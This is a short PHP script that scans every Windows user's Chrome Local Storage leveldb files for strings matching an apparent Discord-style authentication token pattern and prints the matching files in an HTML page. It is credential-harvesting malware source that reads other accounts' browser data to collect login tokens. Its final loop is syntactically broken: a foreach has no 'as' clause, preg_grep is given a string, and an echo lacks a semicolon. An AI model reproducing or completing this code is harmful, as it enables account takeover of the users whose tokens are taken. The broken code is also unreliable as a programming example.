<?php
    $users = scandir('C:\\Users');
    foreach ($users as $i => $user) {
        $pasta = 'C:\\Users\\' . $user;
        $chrome = $pasta . '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb';
        if($user == '.' || $user == '..'){
            continue;
        };
        if(is_dir($chrome)) {
            $guh = scandir($chrome);
            $cuh = array_filter($guh,function($v,$k){
                return substr($v,-4) == ".ldb";
            },ARRAY_FILTER_USE_BOTH);
            foreach($cuh as $ii => $dbfile) {
                $data = file_get_contents($chrome . '\\' . $dbfile);
                #echo preg_match_all("/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/",$data);
                if(preg_match_all("/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/",$data) > 0){
                    echo '<h1> ' . $chrome . '\\' . $dbfile . ' </h1>';
                    foreach(preg_grep("/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/",$data)){
                        echo "<p>"
                    }
                };
            };
        };
    };
?>
